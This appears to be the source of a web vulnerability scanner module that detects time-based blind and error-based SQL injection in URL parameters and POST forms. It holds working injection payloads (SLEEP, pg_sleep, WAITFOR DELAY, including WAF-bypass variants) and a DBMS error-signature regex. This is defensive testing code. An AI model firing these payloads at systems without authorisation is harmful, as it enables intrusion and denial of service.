"""Time-based blind SQL injection — triple-confirmation zero-FP."""
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_get, wrap_finding, standard_response)
from tools._payloads.sqli import SQL_PAYLOADS
from tools._spa_state import load_spa_state
from tools.webapp import _post_forms as pf
from tools.webapp._webapp_common import vuln_response, precheck_target
from tools._payloads.webapp._loader import load_json
from tools._vl_core.turbo import vl_turbo
from tools._vl_core.verify import vl_verify
router = APIRouter()
# Merge baked-in library with AI-curated extras (tools/_payloads/vuln/sqli_extra_payloads.json).
# Format: (name, template, dbms) — same tuple shape the rest of the scanner expects.
_AI_EXTRA = load_json("sqli_extra_payloads", fallback=[])
_MERGED = list(SQL_PAYLOADS) + [p for p in _AI_EXTRA if isinstance(p, dict) and "payload" in p]
_PAYLOADS = [
    (f"{p['dbms'].lower()}_{p.get('category','time')}_{i}", p['payload'], p['dbms'])
    for i, p in enumerate(_MERGED)
    if p.get("category") in ("time", "stacked-time", "waf-bypass") and "{N}" in p.get("payload", "")
][:60]  # cap at 60 per scan (was 40; AI extras add WAF-bypass variants)

# SQLI-SINGLE-SLEEP-V1 — a plain "AND SLEEP(N)" runs once PER MATCHED ROW
# (DVWA: 5 users -> 25s per probe), burning the wall-clock budget and holding
# the target's PHP session lock so every other scanner sharing the session
# times out. A derived-table sleep executes exactly once. Tried first.
_SINGLE_SLEEP = [
    ("mysql_once_str", "1' AND (SELECT 1 FROM (SELECT SLEEP({N}))vl)-- -", "MySQL"),
    ("mysql_once_int", "1 AND (SELECT 1 FROM (SELECT SLEEP({N}))vl)", "MySQL"),
    ("pgsql_once_str", "1' AND 1=(SELECT 1 FROM PG_SLEEP({N}))-- -", "PostgreSQL"),
]
_PAYLOADS = _SINGLE_SLEEP + [p for p in _PAYLOADS if p[1] not in {x[1] for x in _SINGLE_SLEEP}]

# SQLI-ERROR-BASED-V1 — DBMS error signatures. Confirmation: the error
# appears for a lone quote, is ABSENT from the benign baseline, and is ABSENT
# again when the quote is balanced ('' / "") — i.e. the input reaches SQL.
_SQL_ERRORS = re.compile(
    r"(You have an error in your SQL syntax|mysqli?_fetch|mysql_num_rows|"
    r"Warning:\s*mysqli?_|MySQLSyntaxErrorException|valid MySQL result|"
    r"check the manual that (?:corresponds|fits) to your (?:MySQL|MariaDB)|"
    r"PG::SyntaxError|pg_query\(\)|PostgreSQL.*?ERROR|ERROR:\s+syntax error at or near|"
    r"unterminated quoted string at or near|Unclosed quotation mark after the character string|"
    r"Microsoft OLE DB Provider for SQL Server|SQLServerException|ODBC SQL Server Driver|"
    r"ORA-0\d{4}|quoted string not properly terminated|SQLite3?::|SQLITE_ERROR|"
    r"sqlite3\.OperationalError|near \"[^\"]{0,20}\": syntax error|SQLSTATE\[\w+\])",
    re.I)

# Fallback hardcoded baseline (used only if library load failed somehow)
if not _PAYLOADS:
    _PAYLOADS = [
        ("mysql_int",  "1 AND SLEEP({N})",                                "MySQL"),
        ("mysql_str",  "1' AND SLEEP({N})-- -",                           "MySQL"),
        ("pgsql_int",  "1 AND pg_sleep({N})",                             "PostgreSQL"),
        ("pgsql_str",  "1' AND pg_sleep({N})-- -",                        "PostgreSQL"),
        ("mssql_str",  "1'; WAITFOR DELAY '0:0:{N}'-- -",                 "MSSQL"),
        ("oracle_str", "1' AND dbms_pipe.receive_message(('a'),{N})-- -", "Oracle"),
    ]

def _time_get(url, req, timeout):
    t0 = time.time()
    r = safe_get(url, req=req, allow_redirects=True, timeout=timeout)
    return r, time.time() - t0

@router.post("/api/webapp/scan/sqli")
@vl_turbo(timeout_s=170)   # 60s GET + 40s POST-form phase + in-flight probes (orchestrator cap 240s)
@vl_verify()
def scan_sqli(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target)
    unreachable = precheck_target(base, req)
    if unreachable:
        return vuln_response(tool="sqli", target=req.target, findings=[],
            tested=1, skipped_reason=unreachable)
    parsed = urlparse(base)
    params_base = parse_qs(parsed.query)

    # Build the test set: any URL with query params is worth probing.
    # Source: base URL + SPA-discovered URLs that carry ?param= segments.
    test_urls = []
    if params_base:
        test_urls.append((base, params_base))
    spa = load_spa_state(req.target)
    post_forms = pf.normalized_post_forms(spa, limit=6)
    for u in spa.get("urls", []):
        try:
            up = urlparse(u)
            ps = parse_qs(up.query)
            if ps:
                test_urls.append((u, ps))
        except Exception:
            continue
    if not test_urls and not post_forms:
        return standard_response(tool="sqli", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason=("No URL parameters present on base or SPA-discovered "
                          "endpoints — append ?id=1 to test, or run the SPA Crawler "
                          "first to discover dynamic endpoints."))

    # DEDUPE-BY-PATH-V1 — a handful of same-path URLs (e.g. DVWA's five
    # instructions.php?doc=X variants) must not consume all the limited test
    # slots and crowd out distinct injectable endpoints like
    # /vulnerabilities/sqli/?id=1. Keep the first URL per unique path.
    _seen_paths: set = set()
    _deduped = []
    for _u, _ps in test_urls:
        _p = urlparse(_u).path
        if _p in _seen_paths:
            continue
        _seen_paths.add(_p)
        _deduped.append((_u, _ps))
    test_urls = _deduped

    # PRIORITIZE-INJECTABLE-V1 — time-based probes are slow (a target that
    # runs SLEEP() once per matched row can take 20s+ per probe), so with a
    # fixed wall-clock budget the scanner must test the most likely-injectable
    # endpoints FIRST or it gets killed before reaching them. Rank URLs whose
    # path or parameter names look database-backed (id, user, cat, item,
    # search, query, sqli, …) ahead of the rest.
    _INJ_HINTS = ("id", "user", "uid", "cat", "item", "product", "order",
                  "search", "query", "q", "name", "page", "view", "record",
                  "sql", "select", "report", "news", "article")
    def _inj_rank(entry):
        _u, _ps = entry
        hay = (_u + " " + " ".join(_ps.keys())).lower()
        return -sum(1 for h in _INJ_HINTS if h in hay)
    test_urls.sort(key=_inj_rank)

    findings, tests, confirmed = [], 0, []
    _, t0 = _time_get(base, req, timeout=20)
    # SPEED-V2 — wall-clock cap. Without this the inner loop can run for
    # 240s on slow targets and hit the orchestrator's per-tool kill switch,
    # surfacing as a confusing ERROR. Bail at 60s and report whatever we
    # found so far as a clean SKIPPED.
    _wallclock_start = time.time()
    _WALLCLOCK_BUDGET = 60.0
    _bailed = False
    _err_hits = set()

    def _err_probe(test_url, params, key):
        """SQLI-ERROR-BASED-V1: (finding|None) using 3 fast requests."""
        up = urlparse(test_url)

        def _get(v):
            np_ = {k: vv[0] for k, vv in params.items()}
            np_[key] = v
            r = safe_get(urlunparse(up._replace(query=urlencode(np_))), req=req,
                         allow_redirects=True, timeout=10, retries=0)
            return (r.text or "")[:60000] if r is not None else None
        base_v = params[key][0] if params.get(key) else "1"
        b = _get(base_v)
        if b is None or _SQL_ERRORS.search(b):
            return None
        for q in ("'", '"'):
            e = _get(base_v + q)
            if not e:
                continue
            m = _SQL_ERRORS.search(e)
            if not m:
                continue
            ok = _get(base_v + q + q)
            if ok is None or _SQL_ERRORS.search(ok):
                continue
            return wrap_finding(
                f"Error-based SQLi in {key!r} at {test_url}",
                "CRITICAL", cvss="9.8", cwe="CWE-89", owasp="A03:2021",
                remediation="Use parameterised queries (prepared statements). Never concatenate user input into SQL.",
                evidence_marker=(f"url={test_url} param={key}: {base_v + q!r} -> database error "
                                 f"{m.group(0)[:80]!r}; balanced {base_v + q + q!r} and baseline -> no error"))
        return None

    for test_url, params in test_urls[:12]:
        for key in list(params.keys())[:3]:
            if time.time() - _wallclock_start > 20:
                break
            tests += 1
            try:
                f = _err_probe(test_url, params, key)
            except Exception:
                f = None
            if f:
                findings.append(f)
                _err_hits.add((urlparse(test_url).path, key))
                confirmed.append({"url": test_url, "param": key, "method": "error"})

    for test_url, params in test_urls[:12]:
        if _bailed: break
        url_parsed = urlparse(test_url)
        for key in list(params.keys())[:3]:
            if _bailed: break
            if (url_parsed.path, key) in _err_hits:
                continue   # already proven; spend the budget elsewhere
            for name, tmpl, db in _PAYLOADS:
                if time.time() - _wallclock_start > _WALLCLOCK_BUDGET:
                    _bailed = True; break
                tests += 1
                payload5 = tmpl.replace("{N}", "5")
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = payload5
                probe_url = urlunparse(url_parsed._replace(query=urlencode(new_params)))
                _, t1 = _time_get(probe_url, req, timeout=25)
                if t1 < t0 + 4: continue
                payload2 = tmpl.replace("{N}", "2")
                new_params[key] = payload2
                probe_url2 = urlunparse(url_parsed._replace(query=urlencode(new_params)))
                _, t2 = _time_get(probe_url2, req, timeout=15)
                if t2 > t0 + 1 and t1 > t2:
                    findings.append(wrap_finding(
                        f"Time-based blind SQLi in {key!r} ({db}) at {test_url}",
                        "CRITICAL", cvss="9.8", cwe="CWE-89", owasp="A03:2021",
                        remediation="Use parameterised queries (prepared statements). Never concatenate user input into SQL.",
                        evidence_marker=f"url={test_url} param={key} SLEEP(5)={t1:.2f}s, SLEEP(2)={t2:.2f}s, baseline={t0:.2f}s"))
                    confirmed.append({"url": test_url, "param": key, "db": db,
                                       "t0": t0, "t1": t1, "t2": t2})
                    break
    # POST-FORM-INJECT-V1 — SQLi behind POST forms (login-less search boxes,
    # DVWA medium's POST id, ...). One field at a time, other fields at their
    # defaults, fresh CSRF token fetched before each submission (outside the
    # timed window). Confirmation is STRICTER than the GET loop because it
    # adopts TIMING-FP-V1: per-form baseline, SAME timeout ceiling for both
    # probes, a timeout/hang is rejected, and the SLEEP(5)-SLEEP(2) gap must
    # actually appear (>=2s) — a merely slow or hanging form cannot confirm.
    _post_start = time.time()
    _POST_BUDGET = 40.0
    _post_bailed = False
    _POST_TIMEOUT = 20
    post_forms_tested = []
    for _fi, form in enumerate(post_forms):
        if _post_bailed: break
        # Fair share per form so one slow form (e.g. DVWA exec, ~3s ping per
        # submit) cannot starve the remaining forms.
        _left = _POST_BUDGET - (time.time() - _post_start)
        if _left <= 0:
            _post_bailed = True; break
        _form_deadline = time.time() + max(8.0, _left / (len(post_forms) - _fi))
        action = form["action"]
        post_forms_tested.append(action)
        for key in form["injectable"][:3]:
            if _post_bailed: break
            _bd = pf.build_data(form, req, key, "1")
            _tb0 = time.time()
            pf.post_data(form, _bd, req, timeout=_POST_TIMEOUT)
            tb = time.time() - _tb0
            for name, tmpl, db in _PAYLOADS[:24]:
                if time.time() > _form_deadline:
                    break
                if (time.time() - _post_start > _POST_BUDGET or
                        time.time() - _wallclock_start > 125):  # stay under vl_turbo cap
                    _post_bailed = True; break
                tests += 1
                d = pf.build_data(form, req, key, tmpl.replace("{N}", "5"))
                _s = time.time(); pf.post_data(form, d, req, timeout=_POST_TIMEOUT)
                t1 = time.time() - _s
                dd1 = t1 - tb
                if dd1 < 4 or t1 >= _POST_TIMEOUT - 0.5:
                    continue
                d2 = pf.build_data(form, req, key, tmpl.replace("{N}", "2"))
                _s = time.time(); pf.post_data(form, d2, req, timeout=_POST_TIMEOUT)
                t2 = time.time() - _s
                dd2 = t2 - tb
                if dd2 >= 1.0 and (t1 - t2) >= 2.0 and t2 < _POST_TIMEOUT - 0.5:
                    findings.append(wrap_finding(
                        f"Time-based blind SQLi in POST field {key!r} ({db}) at {action}",
                        "CRITICAL", cvss="9.8", cwe="CWE-89", owasp="A03:2021",
                        remediation="Use parameterised queries (prepared statements). Never concatenate user input into SQL.",
                        evidence_marker=(f"POST {action} field={key} SLEEP(5)={t1:.2f}s, "
                                         f"SLEEP(2)={t2:.2f}s, form-baseline={tb:.2f}s")))
                    confirmed.append({"url": action, "param": key, "db": db, "method": "POST",
                                      "t0": tb, "t1": t1, "t2": t2})
                    break
            else:
                continue
            break

    summary = (f"Time-based SQLi: {tests} payloads tested in "
               f"{time.time() - _wallclock_start:.1f}s, triple-confirmation via SLEEP(5)+SLEEP(2)")
    summary += f"; {len(post_forms_tested)} POST form(s) tested"
    if _bailed:
        summary += f" — wall-clock bailed at {_WALLCLOCK_BUDGET}s (target too slow for full payload set)"
    if _post_bailed:
        summary += f" — POST-form phase bailed at {_POST_BUDGET}s"
    return vuln_response(tool="sqli", target=req.target, findings=findings,
        tested=max(tests, 1),
        what_checked="URL parameters and POST form fields for time-based SQL injection (triple-confirmation SLEEP)",
        tests_summary=summary,
        raw_data={"sqli": {"confirmed": confirmed, "baseline_seconds": t0,
                            "post_forms_tested": post_forms_tested,
                            "wallclock_bailed": _bailed,
                            "post_wallclock_bailed": _post_bailed}})
def register(app): app.include_router(router)
